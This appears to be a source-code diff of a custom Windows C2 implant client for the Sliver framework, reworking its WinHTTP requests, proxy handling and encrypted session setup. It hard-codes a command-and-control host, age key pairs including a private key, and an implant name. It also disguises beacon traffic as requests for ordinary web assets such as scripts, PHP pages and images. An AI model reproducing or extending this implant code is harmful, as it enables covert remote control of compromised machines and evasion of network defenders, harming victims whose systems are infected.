@@ -296,8 +296,8 @@ PHTTP_SESSION HttpSessionInit
 	LPWSTR lpHostName = NULL;
 
 	Result = ALLOC(sizeof(HTTP_SESSION));
-	RtlSecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
-	RtlSecureZeroMemory(&ProxyIE, sizeof(ProxyIE));
+	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
+	SecureZeroMemory(&ProxyIE, sizeof(ProxyIE));
 	if (pProxyInfo == NULL) {
 		dwAccessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
 		lpProxyName = WINHTTP_NO_PROXY_NAME;
@@ -348,6 +348,7 @@ PHTTP_SESSION HttpSessionInit
 	}
 
 	Result->hSession = WinHttpOpen(NULL, dwAccessType, lpProxyName, lpProxyBypass, 0);
+	//Result->hSession = WinHttpOpen(NULL, dwAccessType, L"http://127.0.0.1:8888", L"<local>", 0);
 	if (!Result->hSession) {
 		LogError(L"WinHttpOpen failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		FreeHttpSession(Result);
@@ -415,8 +416,7 @@ BOOL SetHeader
 
 	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, lstrlenW(lpFullHeader), WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
 	if (!Result) {
-		wprintf(L"WinHttpAddRequestHeaders failed at %lls. Error code: 0x%08x.\n", __FUNCTIONW__, GetLastError());
-		printf("lpHeaderName: %s; lpHeaderData: %s\n", lpHeaderName, lpHeaderData);
+		LogError(L"WinHttpAddRequestHeaders failed at %lls. Error code: 0x%08x.\n", __FUNCTIONW__, GetLastError());
 	}
 
 	FREE(lpFullHeader);
@@ -429,9 +429,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
-	_In_ DWORD dwNumberOfAttemps,
-	_In_opt_ LPSTR lpData,
-	_In_opt_ DWORD cbData
+	_In_ DWORD dwNumberOfAttemps
 )
 {
 	LPWSTR lpMethod = NULL;
@@ -440,21 +438,20 @@ HINTERNET SendRequest
 	HINTERNET hRequest = NULL;
 	DWORD i = 0;
 	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
-	LPSTR xContentType = NULL;
-	LPSTR xData = lpData;
-	DWORD xDataSize = cbData;
 	DWORD dwLastError = 0;
 	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
 
-	pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
+	if (lstrlenA(pUri->lpPathWithQuery) > 0) {
+		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
+	}
+
 	lpMethod = ConvertCharToWchar(GetMethodString(pRequest->Method));
 	if (pUri->bUseHttps) {
 		dwFlag |= WINHTTP_FLAG_SECURE;
 	}
 
 	hRequest = WinHttpOpenRequest(This->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
-	if (hRequest == NULL)
-	{
+	if (hRequest == NULL) {
 		LogError(L"WinHttpOpenRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
 		goto CLEANUP;
 	}
@@ -472,23 +469,15 @@ HINTERNET SendRequest
 
 	pProxyInfo = GetProxyForUrl(This->pHttpSession, This->pUri);
 	if (pProxyInfo != NULL) {
+		/*pProxyInfo = ALLOC(sizeof(WINHTTP_PROXY_INFO));
+		pProxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+		pProxyInfo->lpszProxy = L"http://127.0.0.1:8888";
+		pProxyInfo->lpszProxyBypass = L"<local>";*/
 		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
 	}
 
-	if (pRequest->ContentTy != NULL) {
-		xContentType = DuplicateStrA(pRequest->ContentTy, 0);
-	}
-
-	if (lpData == NULL) {
-		xData = pRequest->lpData;
-		xDataSize = pRequest->cbData;
-	}
-
-	if (xContentType != NULL) {
-		SetHeader(hRequest, GetHeaderString(ContentType), xContentType);
-	}
-
-	while (!WinHttpSendRequest(hRequest, NULL, 0, xData, xDataSize, xDataSize, NULL)) {
+	i = 0;
+	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, NULL)) {
 		dwLastError = GetLastError();
 		LogError(L"WinHttpSendRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
 		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
@@ -512,16 +501,12 @@ HINTERNET SendRequest
 	}
 
 	if (!WinHttpReceiveResponse(hRequest, NULL)) {
-		hRequest = NULL;
 		LogError(L"WinHttpReceiveResponse failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		WinHttpCloseHandle(hRequest);
+		hRequest = NULL;
 		goto CLEANUP;
 	}
-
 CLEANUP:
-	if (xContentType != NULL) {
-		FREE(xContentType);
-	}
-
 	if (lpMethod != NULL) {
 		FREE(lpMethod);
 	}
@@ -553,11 +538,13 @@ PWINHTTP_PROXY_INFO GetProxyForUrl
 
 	SecureZeroMemory(&AutoProxyOpt, sizeof(AutoProxyOpt));
 	if (!pHttpSession->lpProxyAutoConfigUrl) {
+	//if (FALSE) {
 		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
 		AutoProxyOpt.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
 	}
 	else {
 		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
+		//AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar("http://127.0.0.1:8888/script");
 		AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar(pHttpSession->lpProxyAutoConfigUrl);
 	}
 
@@ -565,10 +552,13 @@ PWINHTTP_PROXY_INFO GetProxyForUrl
 	Result = ALLOC(sizeof(WINHTTP_PROXY_INFO));
 	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
 	if (!WinHttpGetProxyForUrl(pHttpSession->hSession, lpFullUri, &AutoProxyOpt, Result)) {
-		goto END;
+		LogError(L"WinHttpGetProxyForUrl failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		FREE(Result);
+		Result = NULL;
+		goto CLEANUP;
 	}
 
-END:
+CLEANUP:
 	if (AutoProxyOpt.lpszAutoConfigUrl != NULL) {
 		FREE(AutoProxyOpt.lpszAutoConfigUrl);
 	}
@@ -589,7 +579,7 @@ DWORD ReadStatusCode
 	DWORD dwSize = sizeof(dwResult);
 
 	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwResult, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
-		wprintf(L"WinHttpQueryHeaders failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"WinHttpQueryHeaders failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		return 0;
 	}
 	
@@ -654,7 +644,7 @@ VOID FreeHttpSession
 {
 	if (pHttpSession != NULL) {
 		if (pHttpSession->lpProxyAutoConfigUrl != NULL) {
-			FREE(pHttpSession);
+			FREE(pHttpSession->lpProxyAutoConfigUrl);
 		}
 
 		if (pHttpSession->hSession != NULL) {
@@ -689,19 +679,13 @@ VOID FreeHttpRequest
 	DWORD i = 0;
 
 	if (pHttpReq != NULL) {
-		if (pHttpReq->lpData != NULL) {
-			FREE(pHttpReq->lpData);
-		}
-
-		if (pHttpReq->ContentTy != NULL) {
-			FREE(pHttpReq->ContentTy);
-		}
-
 		for (i = 0; i < _countof(pHttpReq->Headers); i++) {
 			if (pHttpReq->Headers[i] != NULL) {
 				FREE(pHttpReq->Headers[i]);
 			}
 		}
+
+		FREE(pHttpReq);
 	}
 }
 
@@ -760,8 +744,24 @@ VOID FreeSliverHttpClient
 		FREE(pClient->lpHostName);
 	}
 
+	if (pClient->lpRecipientPubKey != NULL) {
+		FREE(pClient->lpRecipientPubKey);
+	}
+
+	if (pClient->lpPeerPubKey != NULL) {
+		FREE(pClient->lpPeerPubKey);
+	}
+
+	if (pClient->lpPeerPrivKey != NULL) {
+		FREE(pClient->lpPeerPrivKey);
+	}
+
 	if (pClient->HttpConfig.lpUserAgent != NULL) {
 		FREE(pClient->HttpConfig.lpUserAgent);
+	}
+
+	if (pClient->HttpConfig.lpAccessToken != NULL) {
+		FREE(pClient->HttpConfig.lpAccessToken);
 	}
 
 	for (i = 0; i < _countof(pClient->HttpConfig.AdditionalHeaders); i++) {
@@ -775,6 +775,7 @@ VOID FreeSliverHttpClient
 	}
 
 	FreeWebProxy(pClient->HttpConfig.pProxyConfig);
+	FreeHttpClient(pClient->pHttpClient);
 	FREE(pClient);
 }
 
@@ -782,26 +783,19 @@ PHTTP_REQUEST CreateHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ HttpMethod Method,
-	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
 	_In_ DWORD cbData
 )
 {
 	PHTTP_REQUEST Result = NULL;
-	DWORD i = 0;
 
 	Result = ALLOC(sizeof(HTTP_REQUEST));
 	Result->dwConnectTimeout = pHttpConfig->dwConnectTimeout;
 	Result->dwResolveTimeout = pHttpConfig->dwResolveTimeout;
 	Result->dwSendTimeout = pHttpConfig->dwSendTimeout;
 	Result->dwReceiveTimeout = pHttpConfig->dwReceiveTimeout;
-	if (lpContentType != NULL) {
-		Result->ContentTy = DuplicateStrA(lpContentType, 0);
-	}
-
-	if (lpData != NULL) {
-		Result->lpData = ALLOC(cbData);
-		memcpy(Result->lpData, lpData, cbData);
+	if (lpData != NULL && cbData > 0) {
+		Result->lpData = lpData;
 		Result->cbData = cbData;
 	}
 
@@ -847,13 +841,26 @@ PHTTP_RESP SendHttpRequest
 	PHTTP_RESP pResult = NULL;
 	LPSTR lpAuthorizationHeader = NULL;
 
-	pHttpRequest = CreateHttpRequest(pHttpConfig, Method, lpContentType, lpData, cbData);
-	if (pHttpRequest != NULL) {
-		for (i = 0; i < HeaderEnumEnd; i++) {
+	pHttpRequest = CreateHttpRequest(pHttpConfig, Method, lpData, cbData);
+	for (i = 0; i < HeaderEnumEnd; i++) {
+		if (pHttpConfig->AdditionalHeaders[i] != NULL) {
 			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
 		}
 	}
 
+	if (lpContentType != NULL) {
+		if (pHttpRequest->Headers[ContentType] != NULL) {
+			FREE(pHttpRequest->Headers[ContentType]);
+		}
+
+		pHttpRequest->Headers[ContentType] = DuplicateStrA(lpContentType, 0);
+	}
+	
+	if (pHttpRequest->Headers[CacheControl] != NULL) {
+		FREE(pHttpRequest->Headers[CacheControl]);
+	}
+
+	pHttpRequest->Headers[CacheControl] = DuplicateStrA("no-cache", 0);
 	if (pHttpRequest->Headers[UserAgent] != NULL) {
 		FREE(pHttpRequest->Headers[UserAgent]);
 	}
@@ -878,14 +885,14 @@ PHTTP_RESP SendHttpRequest
 		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
 	}
 
-	hRequest = SendRequest(pHttpClient, pHttpRequest, NULL, NULL, 0);
+	hRequest = SendRequest(pHttpClient, pHttpRequest, pHttpConfig->dwNumberOfAttemps);
 	if (hRequest == NULL) {
 		goto CLEANUP;
 	}
 
 	pResult = ALLOC(sizeof(HTTP_RESP));
 	dwStatusCode = ReadStatusCode(hRequest);
-	if (dwStatusCode == OK && GetRespData) {
+	if (dwStatusCode == HTTP_STATUS_OK && GetRespData) {
 		if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
 			if (pResult->pRespData != NULL) {
 				FREE(pResult->pRespData);
@@ -895,7 +902,7 @@ PHTTP_RESP SendHttpRequest
 			cbResp = 0;
 		}
 	}
-	else if (dwStatusCode != OK) {
+	else if (dwStatusCode != HTTP_STATUS_OK) {
 		LogError(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
 	}
 	
@@ -903,14 +910,6 @@ PHTTP_RESP SendHttpRequest
 	pResult->cbResp = cbResp;
 	pResult->dwStatusCode = dwStatusCode;
 CLEANUP:
-	if (lpAuthorizationHeader != NULL) {
-		FREE(lpAuthorizationHeader);
-	}
-
-	if (lpAuthorizationHeader != NULL) {
-		FREE(lpAuthorizationHeader);
-	}
-
 	FreeHttpRequest(pHttpRequest);
 	return pResult;
 };
@@ -918,7 +917,6 @@ CLEANUP:
 PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 {
 	LPSTR lpProxy = NULL;
-	PBYTE pSKey = NULL;
 	PSLIVER_HTTP_CLIENT pResult = NULL;
 	BOOL IsOk = FALSE;
 	LPSTR lpEncodedSessionKey = NULL;
@@ -934,9 +932,9 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/
 
 	// Laptop config ---------------------------------------------------------------------
-	CHAR szRecipientPubKey[] = "age103wh7xqpzhd3m3qmjf69z57equeecl057y0nh5fgfdr3np455c0qknjum8";
-	CHAR szPeerPubKey[] = "age1e983tu02e4ht5m5s3kdc8gcddpqs8jvkdft4644e80ngnh3rrvvqw06pk2";
-	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1H8ACTYAEN9TN8XM4FNJR0KLAFR0FDMAQ8NTJTLKU3JZA6TWR7QSQ206NN8";
+	CHAR szRecipientPubKey[] = "age1r572ves6lze95fmtfah5lxrxmmt43y6pn6yj3hqzpjrugugnff0s3jfjul";
+	CHAR szPeerPubKey[] = "age1gy3epqygrqfmfj860dxgpje4lrf6u784g0xggwkqtezvhf8cf55qeg0lxv";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1HUNWLD0YWPK98AA7S6FQDWKTVSX9HS6QDVQV9Q4G82EPWJ6K3ZPQDT6MHN";
 	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
 	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
 	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
@@ -944,20 +942,16 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
 	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
-	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: C974C3DEE0AE9DF4\nRWT0na7g3sN0yad3zBthDFTfPuEnuG+wDeLQesyaBb3nTCIVsBg+PXAv";
-
+	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: 54F9A6711F059ED1\nRWTRngUfcab5VNJWy1PKeUHScRTf/GBnzp9c7ynZTuJcDybb2HgHwfN/";
 	CHAR szHostName[] = "https://ubuntu-icefrog2000.com";
 	DWORD i = 0;
 
 	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
-	pSKey = GenRandomBytes(CHACHA20_KEY_SIZE + 2);
-	pSKey[0] = '?';
-	pSKey[1] = CHACHA20_KEY_SIZE;
-	pResult->pSessionKey = AgeKeyExToServer(szRecipientPubKey, szPrivPrivKey, szPeerPubKey, pSKey, CHACHA20_KEY_SIZE + 2, &pResult->cbSessionKey);
-	if (pResult->pSessionKey == NULL || pResult->cbSessionKey == 0) {
-		goto CLEANUP;
-	}
-
+	lstrcpyA(pResult->szSliverName, "TALL_MEAT");
+	pResult->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
+	pResult->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
+	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
+	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
 	pResult->HttpConfig.lpUserAgent = DuplicateStrA(szUserAgent, 0);
 	lpProxy = GetProxyConfig();
 	if (lpProxy != NULL) {
@@ -969,43 +963,46 @@ PSLIVER_HTTP_CLIENT SliverHttpClientInit()
 		}
 	}
 
+	pResult->HttpConfig.dwNumberOfAttemps = 10;
+	pResult->cbPollPaths = _countof(PollPaths);
 	for (i = 0; i < _countof(PollPaths); i++) {
 		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
 	}
 
+	pResult->cbPollFiles = _countof(PollFiles);
 	for (i = 0; i < _countof(PollFiles); i++) {
 		pResult->PollFiles[i] = DuplicateStrA(PollFiles[i], 0);
 	}
 
+	pResult->cbSessionFiles = _countof(SessionFiles);
 	for (i = 0; i < _countof(SessionFiles); i++) {
 		pResult->SessionFiles[i] = DuplicateStrA(SessionFiles[i], 0);
 	}
 
+	pResult->cbSessionPaths = _countof(SessionPaths);
 	for (i = 0; i < _countof(SessionPaths); i++) {
 		pResult->SessionPaths[i] = DuplicateStrA(SessionPaths[i], 0);
 	}
 
+	pResult->cbCloseFiles = _countof(CloseFiles);
 	for (i = 0; i < _countof(CloseFiles); i++) {
 		pResult->CloseFiles[i] = DuplicateStrA(CloseFiles[i], 0);
 	}
 
+	pResult->cbClosePaths = _countof(ClosePaths);
 	for (i = 0; i < _countof(ClosePaths); i++) {
 		pResult->ClosePaths[i] = DuplicateStrA(ClosePaths[i], 0);
 	}
 
 	pResult->dwMinNumOfSegments = 2;
 	pResult->dwMaxNumOfSegments = 4;
-	pResult->uEncoderNonce = 4258;
+	pResult->uEncoderNonce = 51666;
 	pResult->UseStandardPort = TRUE;
 	pResult->lpHostName = DuplicateStrA(szHostName, 0);
 	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
-
+	pResult->uReconnectInterval = 60000000000;
 	IsOk = TRUE;
 CLEANUP:
-	if (pSKey != NULL) {
-		FREE(pSKey);
-	}
-
 	if (lpProxy != NULL) {
 		FREE(lpProxy);
 	}
@@ -1056,7 +1053,9 @@ LPSTR JoinUrlPath
 
 		lstrcatA(&lpResult[dwPos], pSegments[i]);
 		dwPos += lstrlenA(pSegments[i]);
-		lstrcatA(&lpResult[dwPos++], "/");
+		if (i < cbSegment - 1) {
+			lstrcatA(&lpResult[dwPos++], "/");
+		}
 	}
 
 	return lpResult;
@@ -1088,7 +1087,7 @@ LPSTR* RandomUrlPath
 		}
 	}
 
-	lpResult = ALLOC((cbResult + 1) * sizeof(LPSTR));
+	lpResult = REALLOC(lpResult, (cbResult + 1) * sizeof(LPSTR));
 	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cbFileNames)], lstrlenA(lpExtension) + 1);
 	lstrcatA(lpFileName, ".");
 	lstrcatA(lpFileName, lpExtension);
@@ -1112,13 +1111,13 @@ LPSTR ParseSegmentsUrl
 	LPSTR lpResult = NULL;
 
 	if (SegmentType == PollType) {
-		pSegments = RandomUrlPath(pClient, pClient->PollPaths, _countof(pClient->PollPaths), pClient->PollFiles, _countof(pClient->PollFiles), "js", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->PollPaths, pClient->cbPollPaths, pClient->PollFiles, pClient->cbPollFiles, "js", &dwNumOfSegments);
 	}
 	else if (SegmentType == SessionType) {
-		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, _countof(pClient->SessionPaths), pClient->SessionFiles, _countof(pClient->SessionFiles), "php", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->SessionPaths, pClient->cbSessionPaths, pClient->SessionFiles, pClient->cbSessionFiles, "php", &dwNumOfSegments);
 	}
 	else if (SegmentType == CloseType) {
-		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, _countof(pClient->ClosePaths), pClient->CloseFiles, _countof(pClient->CloseFiles), "png", &dwNumOfSegments);
+		pSegments = RandomUrlPath(pClient, pClient->ClosePaths, pClient->cbClosePaths, pClient->CloseFiles, pClient->cbCloseFiles, "png", &dwNumOfSegments);
 	}
 	else {
 		goto CLEANUP;
@@ -1139,7 +1138,7 @@ CLEANUP:
 
 LPSTR GenNonceQuery
 (
-	_In_ UINT64 uNonce
+	_In_ UINT64 uNonceID
 )
 {
 	CHAR szNonceQueryArgChars[] = "abcdefghijklmnopqrstuvwxyz";
@@ -1147,7 +1146,9 @@ LPSTR GenNonceQuery
 	LPSTR lpResult = NULL;
 	DWORD dwRandIdx = 0;
 	LPSTR lpTemp = NULL;
+	UINT64 uNonce = 0;
 
+	uNonce = (((UINT64)GenRandomNumber32(0, 9999999)) * 65537) + uNonceID;
 	lpResult = ALLOC(100);
 	sprintf_s(lpResult, 100, "%lld", uNonce);
 	for (i = 0; i < 3; i++) {
@@ -1160,15 +1161,14 @@ LPSTR GenNonceQuery
 	return lpResult;
  }
 
-PURI StartSessionURL
+LPSTR StartSessionURL
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient
 )
 {
 	LPSTR lpUrlPath = NULL;
 	LPSTR lpTemp = NULL;
-	PURI pResult = NULL;
-	LPSTR lpFullUri = NULL;
+	LPSTR lpResult = NULL;
 	LPSTR lpNonce = NULL;
 
 	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
@@ -1177,13 +1177,12 @@ PURI StartSessionURL
 	lpUrlPath = lpTemp;
 	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
 	lstrcatA(lpUrlPath, "html");
-	lpFullUri = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
-	lstrcatA(lpFullUri, "/");
-	lstrcatA(lpFullUri, lpUrlPath);
-	lstrcatA(lpFullUri, "?");
+	lpResult = DuplicateStrA(pClient->lpHostName, lstrlenA(lpUrlPath) + 100);
+	lstrcatA(lpResult, "/");
+	lstrcatA(lpResult, lpUrlPath);
+	lstrcatA(lpResult, "?t=");
 	lpNonce = GenNonceQuery(pClient->uEncoderNonce);
-	lstrcatA(lpFullUri, lpNonce);
-	pResult = UriInit(lpFullUri);
+	lstrcatA(lpResult, lpNonce);
 CLEANUP:
 	if (lpNonce != NULL) {
 		FREE(lpNonce);
@@ -1193,11 +1192,7 @@ CLEANUP:
 		FREE(lpUrlPath);
 	}
 
-	if (lpFullUri != NULL) {
-		FREE(lpFullUri);
-	}
-
-	return pResult;
+	return lpResult;
 }
 
 PBYTE SliverBase64Decode
@@ -1391,6 +1386,10 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 	PWEB_PROXY pProxyConfig = NULL;
 	LPSTR lpSessionId = NULL;
 	DWORD cbSessionId = 0;
+	PBYTE pEncryptedSessionInit = NULL;
+	LPSTR lpRespData = NULL;
+	DWORD cbEncryptedSessionInit = 0;
+	PBYTE pMarshalledData = NULL;
 
 	pSliverClient = SliverHttpClientInit();
 	if (pSliverClient == NULL) {
@@ -1412,13 +1411,23 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 		goto CLEANUP;
 	}
 
-	lpEncodedSessionKey = Base64Encode(pSliverClient->pSessionKey, pSliverClient->cbSessionKey, FALSE);
+	pMarshalledData = ALLOC(CHACHA20_KEY_SIZE + 2);
+	pMarshalledData[0] = 10;
+	pMarshalledData[1] = CHACHA20_KEY_SIZE;
+	memcpy(pMarshalledData + 2, pSliverClient->pSessionKey, CHACHA20_KEY_SIZE);
+	pEncryptedSessionInit = AgeKeyExToServer(pSliverClient->lpRecipientPubKey, pSliverClient->lpPeerPrivKey, pSliverClient->lpPeerPubKey, pMarshalledData, CHACHA20_KEY_SIZE + 2, &cbEncryptedSessionInit);
+	if (pEncryptedSessionInit == NULL || cbEncryptedSessionInit == 0) {
+		goto CLEANUP;
+	}
+
+	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
 	pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
 
-	pDecodedResp = SliverBase64Decode(pResp->pRespData, &cbDecodedResp);
+	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
+	pDecodedResp = SliverBase64Decode(lpRespData, &cbDecodedResp);
 	if (pDecodedResp == NULL || cbDecodedResp == 0) {
 		goto CLEANUP;
 	}
@@ -1436,6 +1445,10 @@ CLEANUP:
 		pSliverClient = NULL;
 	}
 
+	if (lpRespData != NULL) {
+		FREE(lpRespData);
+	}
+
 	if (lpSessionId != NULL) {
 		FREE(lpSessionId);
 	}
@@ -1448,14 +1461,14 @@ CLEANUP:
 		FREE(lpFullUri);
 	}
 
+	if (pMarshalledData != NULL) {
+		FREE(pMarshalledData);
+	}
+
+	if (pEncryptedSessionInit != NULL) {
+		FREE(pEncryptedSessionInit);
+	}
+
 	FreeHttpResp(pResp);
 	return pSliverClient;
-}
-
-BOOL SliverSendHttpRequest
-(
-	_In_ PSLIVER_HTTP_CLIENT pClient
-)
-{
-
 }
